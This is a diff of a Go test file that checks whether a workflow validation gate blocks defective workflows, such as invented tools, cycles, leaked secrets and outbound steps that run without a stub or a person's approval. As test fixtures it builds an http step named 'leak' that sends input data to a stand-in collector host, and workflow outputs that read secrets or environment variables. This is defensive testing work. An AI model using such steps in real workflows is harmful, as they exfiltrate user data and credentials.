@@ -78,6 +78,20 @@ type gateCase struct {
 	wf       *domain.Workflow
 	fixtures []Fixture
 	raw      json.RawMessage
+	stubAll  bool
+}
+
+// stubbed gives each fixture a stand-in for every step a test may not run.
+func stubbed(wf *domain.Workflow, fixtures []Fixture) []Fixture {
+	out := []Fixture{}
+	for _, fixture := range fixtures {
+		fixture.Stubs = map[string]any{}
+		for _, nodeID := range StubRequired(wf) {
+			fixture.Stubs[nodeID] = map[string]any{"ok": true}
+		}
+		out = append(out, fixture)
+	}
+	return out
 }
 
 func runGate(t *testing.T, tc gateCase) []Check {
@@ -91,6 +105,9 @@ func runGate(t *testing.T, tc gateCase) []Check {
 		t.Fatal(err)
 	}
 	fixtures := tc.fixtures
+	if tc.stubAll {
+		fixtures = stubbed(tc.wf, fixtures)
+	}
 	if tc.raw != nil {
 		parsed, problems := ParseFixtures(tc.raw, tc.wf)
 		if len(problems) > 0 {
@@ -113,54 +130,61 @@ func toolConfig(wf *domain.Workflow, key string, value any) {
 func defectiveCorpus() []gateCase {
 	stub := func(raw string) json.RawMessage { return json.RawMessage(raw) }
 	return []gateCase{
-		{"no declared outputs", mutate(readWorkflow("d1"), func(w *domain.Workflow) { w.Outputs = nil }), readFixture(), nil},
-		{"no fixtures", readWorkflow("d2"), nil, nil},
-		{"invented step type", mutate(readWorkflow("d3"), func(w *domain.Workflow) { w.Nodes[0].Type = "teleport" }), readFixture(), nil},
-		{"invented tool", mutate(readWorkflow("d4"), func(w *domain.Workflow) { toolConfig(w, "tool", "text.reverse") }), readFixture(), nil},
+		{"no declared outputs", mutate(readWorkflow("d1"), func(w *domain.Workflow) { w.Outputs = nil }), readFixture(), nil, false},
+		{"no fixtures", readWorkflow("d2"), nil, nil, false},
+		{"invented step type", mutate(readWorkflow("d3"), func(w *domain.Workflow) { w.Nodes[0].Type = "teleport" }), readFixture(), nil, false},
+		{"invented tool", mutate(readWorkflow("d4"), func(w *domain.Workflow) { toolConfig(w, "tool", "text.reverse") }), readFixture(), nil, false},
 		{"missing credential", mutate(writeWorkflow("d5"), func(w *domain.Workflow) {
 			w.Nodes[1].Config["input"] = map[string]any{"credential": "NOPE", "text": "x"}
-		}), readFixture(), nil},
+		}), readFixture(), nil, false},
 		{"secret literal in a header", mutate(readWorkflow("d6"), func(w *domain.Workflow) {
 			w.Nodes = append(w.Nodes, domain.Node{ID: "fetch", Type: "http", Config: map[string]any{
 				"url": "https://api.example.com/x", "method": "GET",
 				"headers": map[string]any{"Authorization": "Bearer sk-live-abcdefghijklmnopqrstuvwx"},
 			}})
-		}), readFixture(), nil},
-		{"write without a recovery contract", mutate(writeWorkflow("d7"), func(w *domain.Workflow) { w.Recovery = nil }), readFixture(), nil},
-		{"write that ignores its result", mutate(writeWorkflow("d8"), func(w *domain.Workflow) { w.Nodes[1].Config["resultPolicy"] = "envelope" }), readFixture(), nil},
+		}), readFixture(), nil, false},
+		{"write without a recovery contract", mutate(writeWorkflow("d7"), func(w *domain.Workflow) { w.Recovery = nil }), readFixture(), nil, false},
+		{"write that ignores its result", mutate(writeWorkflow("d8"), func(w *domain.Workflow) { w.Nodes[1].Config["resultPolicy"] = "envelope" }), readFixture(), nil, false},
 		{"recovery fixture that fails", mutate(writeWorkflow("d9"), func(w *domain.Workflow) {
 			w.Recovery.Contract.Failure.Semantic.EvaluationFixtures[0].Output = map[string]any{"text": ""}
-		}), readFixture(), nil},
+		}), readFixture(), nil, false},
 		{"edge to a missing step", mutate(readWorkflow("d10"), func(w *domain.Workflow) {
 			w.Edges = []domain.Edge{{From: "upper", To: "ghost"}}
-		}), readFixture(), nil},
-		{"duplicate step ids", mutate(readWorkflow("d11"), func(w *domain.Workflow) { w.Nodes = append(w.Nodes, w.Nodes[0]) }), readFixture(), nil},
+		}), readFixture(), nil, false},
+		{"duplicate step ids", mutate(readWorkflow("d11"), func(w *domain.Workflow) { w.Nodes = append(w.Nodes, w.Nodes[0]) }), readFixture(), nil, false},
 		{"http step without a url", mutate(readWorkflow("d12"), func(w *domain.Workflow) {
 			w.Nodes = append(w.Nodes, domain.Node{ID: "fetch", Type: "http", Config: map[string]any{"method": "GET"}})
-		}), readFixture(), nil},
-		{"stub of an unknown step", readWorkflow("d13"), nil, stub(`[{"name":"a","stubs":{"ghost":{}},"expect":{"status":"succeeded"}}]`)},
+		}), readFixture(), nil, false},
+		{"stub of an unknown step", readWorkflow("d13"), nil, stub(`[{"name":"a","stubs":{"ghost":{}},"expect":{"status":"succeeded"}}]`), false},
 		{"stub of an approval", mutate(readWorkflow("d14"), func(w *domain.Workflow) {
 			w.Nodes = append(w.Nodes, domain.Node{ID: "ask", Type: "approval", Config: map[string]any{}})
-		}), nil, stub(`[{"name":"a","stubs":{"ask":{"approved":true}},"expect":{"status":"succeeded"}}]`)},
-		{"fixture without an end state", readWorkflow("d15"), nil, stub(`[{"name":"a","expect":{"status":"fine"}}]`)},
+		}), nil, stub(`[{"name":"a","stubs":{"ask":{"approved":true}},"expect":{"status":"succeeded"}}]`), false},
+		{"fixture without an end state", readWorkflow("d15"), nil, stub(`[{"name":"a","expect":{"status":"fine"}}]`), false},
 		{"api key in a transform", mutate(readWorkflow("d16"), func(w *domain.Workflow) {
 			w.Nodes = append(w.Nodes, domain.Node{ID: "keys", Type: "transform", Config: map[string]any{
 				"mapping": map[string]any{"key": "AKIAIOSFODNN7EXAMPLE"},
 			}})
-		}), readFixture(), nil},
+		}), readFixture(), nil, false},
 		{"invented subworkflow", mutate(readWorkflow("d17"), func(w *domain.Workflow) {
 			w.Nodes = append(w.Nodes, domain.Node{ID: "child", Type: "subworkflow", Config: map[string]any{"workflowId": "wf-ghost"}})
-		}), readFixture(), nil},
+		}), readFixture(), nil, false},
 		{"cycle", mutate(readWorkflow("d18"), func(w *domain.Workflow) {
 			w.Nodes = append(w.Nodes, domain.Node{ID: "again", Type: "noop", Config: map[string]any{}})
 			w.Edges = []domain.Edge{{From: "upper", To: "again"}, {From: "again", To: "upper"}}
-		}), readFixture(), nil},
+		}), readFixture(), nil, false},
 		{"unchecked write http", mutate(readWorkflow("d19"), func(w *domain.Workflow) {
 			w.Nodes = append(w.Nodes, domain.Node{ID: "send", Type: "http", Config: map[string]any{
 				"url": "https://hooks.example.com/x", "method": "POST",
 			}})
-		}), readFixture(), nil},
-		{"duplicate fixture names", readWorkflow("d20"), nil, stub(`[{"name":"a","expect":{"status":"succeeded"}},{"name":"a","expect":{"status":"failed"}}]`)},
+		}), readFixture(), nil, false},
+		{"duplicate fixture names", readWorkflow("d20"), nil, stub(`[{"name":"a","expect":{"status":"succeeded"}},{"name":"a","expect":{"status":"failed"}}]`), false},
+		{"fixture runs an outbound step", mutate(readWorkflow("d21"), func(w *domain.Workflow) {
+			w.Nodes = append(w.Nodes, domain.Node{ID: "fetch", Type: "http", Config: map[string]any{
+				"url": "https://api.example.com/x?q={{context.input.text}}", "method": "GET"}})
+		}), readFixture(), nil, false},
+		{"output reads a secret", mutate(readWorkflow("d22"), func(w *domain.Workflow) {
+			w.Outputs = map[string]string{"key": "{{secret.API_KEY}}"}
+		}), readFixture(), nil, false},
 	}
 }
 
@@ -179,7 +203,7 @@ func soundCorpus() []gateCase {
 				"url": "https://api.example.com/items/{{context.input.text}}", "method": "GET",
 			}})
 		}
-		cases = append(cases, gateCase{fmt.Sprintf("read %d", i), wf, readFixture(), nil})
+		cases = append(cases, gateCase{fmt.Sprintf("read %d", i), wf, readFixture(), nil, true})
 	}
 	for i := range 8 {
 		wf := writeWorkflow(fmt.Sprintf("w%d", i))
@@ -189,7 +213,7 @@ func soundCorpus() []gateCase {
 			}})
 			wf.Edges = append(wf.Edges, domain.Edge{From: "upper", To: "compose"})
 		}
-		cases = append(cases, gateCase{fmt.Sprintf("write %d", i), wf, readFixture(), nil})
+		cases = append(cases, gateCase{fmt.Sprintf("write %d", i), wf, readFixture(), nil, true})
 	}
 	return cases
 }
@@ -208,6 +232,7 @@ func TestGateBlocksDefectsAndPassesSoundWorkflows(t *testing.T) {
 		"fixture without an end state": "fixture_expectation_invalid", "api key in a transform": "secret_literal",
 		"invented subworkflow": "capability_missing", "cycle": "invalid_",
 		"unchecked write http": "recovery_contract_missing", "duplicate fixture names": "fixture_name_invalid",
+		"fixture runs an outbound step": "stub_required", "output reads a secret": "secret_in_outputs",
 	}
 	blocked, missed := 0, []string{}
 	for _, tc := range defectiveCorpus() {
@@ -274,63 +299,56 @@ func TestFixtureVerdicts(t *testing.T) {
 }
 
 func TestDigestBindsDocumentAndFixtures(t *testing.T) {
-	a, _ := Digest([]byte(`{"id":"x"}`), readFixture())
-	b, _ := Digest([]byte(`{"id":"x"}`), readFixture())
-	c, _ := Digest([]byte(`{"id":"x"}`), nil)
-	if a != b || a == c || len(a) != 64 {
-		t.Fatalf("digests %q %q %q", a, b, c)
+	a, _ := Digest("v1", []byte(`{"id":"x"}`), readFixture())
+	b, _ := Digest("v1", []byte(`{"id":"x"}`), readFixture())
+	c, _ := Digest("v1", []byte(`{"id":"x"}`), nil)
+	d, _ := Digest("v2", []byte(`{"id":"x"}`), readFixture())
+	if a != b || a == c || a == d || len(a) != 64 {
+		t.Fatalf("digests %q %q %q %q", a, b, c, d)
 	}
 }
 
-func TestOutboundSurfaceSeesNewTargetsNotLogic(t *testing.T) {
-	base := readWorkflow("o")
-	logic := readWorkflow("o")
-	logic.Outputs = map[string]string{"text": "{{context.upper.output.result.value}}!"}
-	if !slices.Equal(OutboundSurface(base), OutboundSurface(logic)) {
-		t.Fatal("a logic-only change moved the outbound surface")
+func TestStubsAndReachAreFailClosed(t *testing.T) {
+	pure := readWorkflow("p")
+	if len(StubRequired(pure)) != 0 || len(ReachesOut(pure)) != 0 {
+		t.Fatalf("a pure workflow needs stubs or a person: %v %v", StubRequired(pure), ReachesOut(pure))
 	}
 	for name, change := range map[string]func(*domain.Workflow){
-		"new http target": func(w *domain.Workflow) {
-			w.Nodes = append(w.Nodes, domain.Node{ID: "leak", Type: "http", Config: map[string]any{
-				"method": "GET", "url": "https://collector.example/?d={{context.input.text}}"}})
-		},
-		"new secret reference": func(w *domain.Workflow) {
-			w.Nodes[0].Config["input"] = map[string]any{"value": "{{secret.API_KEY}}"}
-		},
-		"new trigger": func(w *domain.Workflow) {
-			w.Nodes = append(w.Nodes, domain.Node{ID: "daily", Type: "schedule", Config: map[string]any{"cronExpression": "0 9 * * *"}})
-		},
-		"different tool": func(w *domain.Workflow) { w.Nodes[0].Config["tool"] = "json.pick" },
-		"different tool input": func(w *domain.Workflow) {
-			w.Nodes[0].Config["input"] = map[string]any{"value": "x", "url": "https://elsewhere"}
-		},
-		"templated target moved by its source": func(w *domain.Workflow) {
-			w.Nodes = append(w.Nodes,
-				domain.Node{ID: "target", Type: "transform", Config: map[string]any{"mapping": map[string]any{"url": "https://a.example"}}},
-				domain.Node{ID: "call", Type: "http", Config: map[string]any{"method": "GET", "url": "{{context.target.output.url}}"}})
+		"http GET": func(w *domain.Workflow) {
+			w.Nodes = append(w.Nodes, domain.Node{ID: "leak", Type: "http", Config: map[string]any{"method": "GET", "url": "https://collector.example/"}})
 		},
 		"secret in a transform": func(w *domain.Workflow) {
 			w.Nodes = append(w.Nodes, domain.Node{ID: "t", Type: "transform", Config: map[string]any{"mapping": map[string]any{"k": "{{ SECRET.Api }}"}}})
 		},
+		"environment in a transform": func(w *domain.Workflow) {
+			w.Nodes = append(w.Nodes, domain.Node{ID: "t", Type: "transform", Config: map[string]any{"mapping": map[string]any{"k": "{{env.HOME}}"}}})
+		},
+		"non-pure tool": func(w *domain.Workflow) { w.Nodes[0].Config["tool"] = "vector.search" },
+		"subworkflow": func(w *domain.Workflow) {
+			w.Nodes = append(w.Nodes, domain.Node{ID: "c", Type: "subworkflow", Config: map[string]any{"workflowId": "x"}})
+		},
+		"unknown type": func(w *domain.Workflow) {
+			w.Nodes = append(w.Nodes, domain.Node{ID: "z", Type: "future_step", Config: map[string]any{}})
+		},
+		"loop": func(w *domain.Workflow) {
+			w.Nodes = append(w.Nodes, domain.Node{ID: "l", Type: "loop", Config: map[string]any{}})
+		},
 	} {
-		changed := readWorkflow("o")
+		changed := readWorkflow("p")
 		change(changed)
-		if slices.Equal(OutboundSurface(base), OutboundSurface(changed)) {
-			t.Fatalf("%s did not move the outbound surface", name)
+		if len(StubRequired(changed)) == 0 || len(ReachesOut(changed)) == 0 {
+			t.Fatalf("%s runs in tests or publishes without a person", name)
 		}
 	}
-}
-
-func TestOutboundSurfaceFollowsTemplatedSources(t *testing.T) {
-	build := func(url string) *domain.Workflow {
-		w := readWorkflow("o")
-		w.Nodes = append(w.Nodes,
-			domain.Node{ID: "target", Type: "transform", Config: map[string]any{"mapping": map[string]any{"url": url}}},
-			domain.Node{ID: "call", Type: "http", Config: map[string]any{"method": "GET", "url": "{{context.target.output.url}}"}})
-		return w
+	trigger := readWorkflow("p")
+	trigger.Nodes = append(trigger.Nodes, domain.Node{ID: "daily", Type: "schedule", Config: map[string]any{"cronExpression": "0 9 * * *"}})
+	if len(StubRequired(trigger)) != 0 || len(ReachesOut(trigger)) == 0 {
+		t.Fatal("a trigger needs a person to publish but no stub to test")
 	}
-	if slices.Equal(OutboundSurface(build("https://a.example")), OutboundSurface(build("https://b.example"))) {
-		t.Fatal("changing a templated target's source did not move the outbound surface")
+	secretOutput := readWorkflow("p")
+	secretOutput.Outputs = map[string]string{"k": "{{secret.KEY}}"}
+	if !slices.Contains(ReachesOut(secretOutput), "/outputs") {
+		t.Fatal("an output reading a secret publishes without a person")
 	}
 }
 
